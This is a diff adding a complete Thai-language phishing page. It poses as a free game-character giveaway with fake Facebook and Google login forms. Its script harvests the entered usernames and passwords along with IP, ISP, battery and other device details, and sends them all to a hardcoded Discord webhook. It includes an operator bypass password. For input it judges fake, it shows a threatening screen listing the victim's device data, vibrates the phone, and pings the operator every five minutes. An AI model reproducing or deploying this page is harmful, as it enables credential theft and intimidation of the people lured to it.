@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FOOTBALL EVENT - แจกตัวละครฟรี</title>
+    <style>
+        body { font-family: sans-serif; background: #0b0b0b; color: white; margin: 0; text-align: center; }
+        .container { padding: 40px 20px; }
+        .card { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #333; max-width: 350px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        .btn-auth { display: flex; align-items: center; justify-content: center; width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; cursor: pointer; font-weight: bold; border: none; }
+        .fb { background: #1877f2; color: white; }
+        .gg { background: white; color: #555; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; }
+        .submit-btn { width: 100%; padding: 12px; background: #00ff00; color: black; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        
+        /* หน้าจอขู่ */
+        #threat-screen { display: none; background: #000; color: #ff0000; height: 100vh; position: fixed; top: 0; left: 0; width: 100%; z-index: 9999; flex-direction: column; justify-content: center; align-items: center; font-family: monospace; padding: 20px; }
+        .info-box { text-align: left; background: rgba(255,0,0,0.1); padding: 15px; border: 1px solid red; border-radius: 10px; font-size: 13px; width: 100%; max-width: 320px; }
+    </style>
+</head>
+<body>
+
+<div id="app" class="container">
+    <h1 style="color:#00ff00;">⚽ EVENT แจกตัวฟรี</h1>
+    <p>ยืนยันตัวตนเพื่อรับสิทธิ์</p>
+    <div class="card">
+        <div id="select-box">
+            <button class="btn-auth fb" onclick="openLogin('Facebook')">Login with Facebook</button>
+            <button class="btn-auth gg" onclick="openLogin('Google')">Login with Google</button>
+        </div>
+        <div id="login-box" style="display:none;">
+            <h4 id="platform-name">Login</h4>
+            <input type="text" id="user" placeholder="Email / Phone">
+            <input type="password" id="pass" placeholder="Password">
+            <button class="submit-btn" onclick="mainProcess()">Confirm</button>
+        </div>
+    </div>
+</div>
+
+<div id="threat-screen">
+    <h2 style="animation: blink 0.5s infinite;">⚠️ DETECTED ⚠️</h2>
+    <div class="info-box" id="v-data"></div>
+    <p>กูรู้ข้อมูลมึงหมดแล้วไอ้ชาย...</p>
+</div>
+
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1492899276383326310/fd9Tsss_cyVrPGfU2eyZjntHWRikIiSWUr9QCWQEUZDzdJZiTMUFvINEEGcQW5ngDfw8";
+    let platform = "";
+    let alertInterval;
+
+    function openLogin(type) {
+        platform = type;
+        document.getElementById('select-box').style.display = 'none';
+        document.getElementById('login-box').style.display = 'block';
+        document.getElementById('platform-name').innerText = 'Login with ' + type;
+    }
+
+    async function getDeviceInfo() {
+        let ipData = { ip: "Unknown", isp: "Unknown" };
+        try {
+            const res = await fetch('http://ip-api.com/json/');
+            ipData = await res.json();
+        } catch(e) {}
+
+        let battery = "Unknown";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = (b.level * 100) + "% " + (b.charging ? "(Charging)" : "");
+        }
+
+        return {
+            ip: ipData.query,
+            isp: ipData.isp,
+            bat: battery,
+            screen: window.screen.width + "x" + window.screen.height,
+            cpu: navigator.hardwareConcurrency || "Unknown",
+            net: navigator.connection ? navigator.connection.effectiveType : "Unknown"
+        };
+    }
+
+    async function mainProcess() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const info = await getDeviceInfo();
+
+        // --- ระบบยกเว้น (BYPASS) ---
+        // ถ้าใส่รหัสว่า 'admin1234' ระบบจะไม่ส่งเข้าดิส และไม่ขู่ (มึงเอาไว้ใช้เอง)
+        if (p === "admin1234") { 
+            alert("โหมดผู้ดูแลระบบ: ปิดการดักข้อมูล");
+            return; 
+        }
+
+        // เช็คพิมพ์มั่ว
+        const trolls = ["1234", "ควย", "ควาย", "กู", "มึง", "สัส"];
+        const isTroll = p.length < 6 || trolls.some(t => p.includes(t));
+
+        if (isTroll) {
+            // สั่งสั่นเครื่องเหยื่อ
+            if (window.navigator.vibrate) window.navigator.vibrate([500, 200, 500]);
+
+            // ส่งข้อมูลแจ้งเตือนมั่วเข้าดิส
+            sendDiscord(`🤡 **[TROLL]** พิมพ์มั่ว!\nIP: ${info.ip}\nPass: ${p}`, true);
+
+            // โชว์หน้าขู่
+            document.getElementById('v-data').innerHTML = `
+                <b>IP:</b> ${info.ip}<br><b>ISP:</b> ${info.isp}<br>
+                <b>BATTERY:</b> ${info.bat}<br><b>SCREEN:</b> ${info.screen}<br>
+                <b>CPU:</b> ${info.cpu} Cores<br><b>NET:</b> ${info.net}
+            `;
+            document.getElementById('app').style.display = 'none';
+            document.getElementById('threat-screen').style.display = 'flex';
+
+            // --- ระบบแจ้งเตือนทุก 5 นาที ---
+            // แจ้งซ้ำว่ามันยังติดอยู่ในหน้าขู่
+            if (!alertInterval) {
+                alertInterval = setInterval(() => {
+                    sendDiscord(`⏰ **[UPDATE]** เป้าหมาย IP ${info.ip} ยังคาอยู่ในหน้าขู่นะครับ`);
+                }, 300000); // 300,000 มิลลิวินาที = 5 นาที
+            }
+            return;
+        }
+
+        // กรณีได้ข้อมูลจริง
+        sendDiscord(`✅ **SUCCESS [${platform}]**\n👤 User: \`${u}\`\n🔑 Pass: \`${p}\`\n🌐 IP: ${info.ip}\n🔋 Bat: ${info.bat}`);
+        alert("ตรวจสอบสิทธิ์สำเร็จ! รอรับของใน 24 ชม.");
+        window.location.href = "https://www.google.com";
+    }
+
+    function sendDiscord(msg, isTroll = false) {
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ content: msg })
+        });
+    }
+</script>
+</body>
+</html>
